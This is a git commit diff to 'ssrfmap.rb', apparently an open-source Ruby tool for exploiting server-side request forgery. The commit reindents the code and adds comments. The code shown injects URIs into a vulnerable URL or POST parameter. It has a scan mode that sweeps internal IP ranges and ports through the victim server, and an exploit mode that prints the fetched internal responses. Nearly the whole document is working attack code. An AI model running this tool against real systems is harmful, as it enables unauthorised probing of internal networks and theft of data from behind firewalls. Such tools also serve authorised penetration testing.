73c06028f0005798283557ccf2d3a2382954ec69
Dreadlocked <gongl556@gmail.com>
2018-08-23 09:38:35 +0100

    Ident fixes

--- ssrfmap.rb
+++ ssrfmap.rb
@@ -1,7 +1,11 @@
+##
+# This script was not intended to be well written, read it at your own risk.
+##
+
 #!/usr/bin/env ruby
 
-require 'typhoeus' # Dependency
-require 'netaddr'  # Dependency
+require 'typhoeus' # External dependency
+require 'netaddr'  # External dependency
 require 'uri'
 require 'optparse'
 require 'base64'
@@ -88,8 +92,8 @@ $aggresivity = {
 }
 
 if !options[:url]
-	puts options[:banner]
-	exit
+  puts options[:banner]
+  exit
 end
 
 #
@@ -97,33 +101,35 @@ end
 # ssrf_uri => URI to inject
 #
 def inject(uri,ssrf_uri)
-	return uri.gsub("_SSRF_",ssrf_uri)
+  return uri.gsub("_SSRF_",ssrf_uri)
 end
 
 #
-# host => Defines vulnerable host
-# final_uri => Defines target uri
-# mode => Defines if script is running on "exploit" mode or just "scan" mode
+# final_uri => Defines target uri.
+# http_method => Defines HTTP method to use on request.
+# body => Defines request body, if not defined it will be "" by default.
+# mode => Defines if script is running on "exploit" mode or just "scan" mode.
+# ssrf_uri => Injected URI
+# regex => If a regex is defined to match on false 200OK responses.
 #
 
 def get_result(final_uri,http_method,body,mode,ssrf_uri,regex)
 
-	if body && body[0] == "{" then # Its JSON
-		content_type = 'application/json'
-	else
-		content_type = 'application/x-www-form-urlencoded'
-	end
+  if body && body[0] == "{" then # Its JSON
+    content_type = 'application/json'
+  else
+    content_type = 'application/x-www-form-urlencoded'
+  end
 
   #puts "Requesting: " + final_uri.to_s
-	request = Typhoeus::Request.new(
-	  "#{final_uri}",
-	  method: http_method.to_sym,
-	  body: body,
-	  headers: { Host: "#{URI(final_uri).host}", Referer: "http://#{URI(final_uri).host}", 'Content-Type' => content_type }
-	)
+  request = Typhoeus::Request.new(
+    "#{final_uri}",
+    method: http_method.to_sym,
+    body: body,
+    headers: { Host: "#{URI(final_uri).host}", Referer: "http://#{URI(final_uri).host}", 'Content-Type' => content_type }
+  )
 
-	request.on_complete do |response|
-
+  request.on_complete do |response|
     $global_request_counter += 1
     STDOUT.flush
     print "[...] Completed requests: #{$global_request_counter.to_s}/#{$options[:ports].split(',').length.to_s}\r"
@@ -132,30 +138,31 @@ def get_result(final_uri,http_method,body,mode,ssrf_uri,regex)
       ssrf_uri = Base64.decode64 ssrf_uri
     end
 
-	  if response.success? && response.response_body
-      if $options[:length] && $options[:length] == response.response_body.length.to_s
-        
+    # There are a few cases to take in account when producing the output
+    if response.success? && response.response_body then
+      if $options[:length] && $options[:length] == response.response_body.length.to_s then
+        # Do nothing, changeme if you want
       elsif regex && response.response_body.include?(regex)
-        
+        # Do nothing, changeme if you want
       else
-  	  	if mode == "exploit"
-  	  		puts response.response_body
-  	  	else
-  	  		puts "[*] Found service on port: " + ssrf_uri + " | Length: " + response.response_body.length.to_s
-  	  	end
+        if mode == "exploit" then
+          puts response.response_body
+        else
+          puts "[*] Found service on port: " + ssrf_uri + " | Length: " + response.response_body.length.to_s
+        end
+     end
+    elsif response.timed_out?  
+      puts "[*] Found service on port: " + ssrf_uri
+    elsif response.code == 0
+      puts(response.return_message)
+    else
+      if mode == "exploit" then
+        puts("HTTP request failed: " + response.code.to_s)
       end
-	  elsif response.timed_out?  
-	  	puts "[*] Found service on port: " + ssrf_uri
-	  elsif response.code == 0
-	    puts(response.return_message)
-	  else
-	  	if mode == "exploit"
-	    	puts("HTTP request failed: " + response.code.to_s)
-	    end
-	  end
-	end
+    end
+  end
 
-	return request
+  return request
 end
 
 #      #
@@ -172,62 +179,63 @@ target_range = options[:range] || "127.0.0.1/32"
 regex = options[:regex]
 
 if options[:post_data] && !options[:method]
-	http_method = :post
+  http_method = :post
 else
-	http_method = options[:method] || :get
+  http_method = options[:method] || :get
 end
 
 #
 # => User defined a target, let's try to exploit it
 #
 if options[:target] then
+  target_uri = URI(options[:target])
+  target_prt = target_uri.scheme
+  target_host = target_uri.host
+  target_path = target_uri.path
+  target_port = target_uri.port
 
-	target_uri = URI(options[:target])
-	target_prt = target_uri.scheme
-	target_host = target_uri.host
-	target_path = target_uri.path
-	target_port = target_uri.port
-
-	ssrf_uri = "#{target_prt}://#{target_host}:#{target_port}#{target_path}"
+  ssrf_uri = "#{target_prt}://#{target_host}:#{target_port}#{target_path}"
   if options[:base64] then
     ssrf_uri = Base64.encode64 ssrf_uri
   end
-	if http_method == :get then
-		uri = URI(inject(options[:url],ssrf_uri))
-	elsif http_method == :post then
-		post_data = inject(post_data,ssrf_uri)
-	end
+  if http_method == :get then
+    uri = URI(inject(options[:url],ssrf_uri))
+  elsif http_method == :post then
+    post_data = inject(post_data,ssrf_uri)
+  end
 
-	get_result(uri,http_method,post_data,"exploit",ssrf_uri,regex).run
-	exit
+  get_result(uri,http_method,post_data,"exploit",ssrf_uri,regex).run
+  exit
 end
 
 #
 # => User does not specified any target, let's find some one!
 #
 target_prt = "http"
-
 target_range = NetAddr::CIDR.create(target_range)
 puts "Running on scan mode:\nTarget: #{target_range}\nProtocol: #{target_prt}"
 
 for i in 0..target_range.size-1 do
-	hydra = Typhoeus::Hydra.new(max_concurrency: $aggresivity[$options[:agv_level]].to_i)
+  hydra = Typhoeus::Hydra.new(max_concurrency: $aggresivity[$options[:agv_level]].to_i)
 
-	target_host = target_range[i]
+  target_host = target_range[i]
 
-	options[:ports].split(',').each do |target_port|
-		ssrf_uri = "#{target_prt}://#{target_host.to_s.split('/')[0]}:#{target_port}"
+  # Queue each request on a Hydra Queue
+  options[:ports].split(',').each do |target_port|
+    ssrf_uri = "#{target_prt}://#{target_host.to_s.split('/')[0]}:#{target_port}"
+
     if options[:base64] then
       ssrf_uri = Base64.encode64 ssrf_uri
     end
-		if http_method == :get then
-			injected_uri = URI(inject(options[:url],ssrf_uri))
-		elsif http_method == :post then
-			injected_post_data = inject(post_data,ssrf_uri)
-		end
-		hydra.queue get_result(injected_uri || uri,http_method,injected_post_data || post_data,"scan",ssrf_uri,regex)
-	end
+
+    if http_method == :get then
+      injected_uri = URI(inject(options[:url],ssrf_uri))
+    elsif http_method == :post then
+      injected_post_data = inject(post_data,ssrf_uri)
+    end
+    hydra.queue get_result(injected_uri || uri,http_method,injected_post_data || post_data,"scan",ssrf_uri,regex)
+  end
 
   puts "[*] Queueing requests for #{target_host.to_s.split('/')[0]}..."
-	hydra.run
+  hydra.run
 end
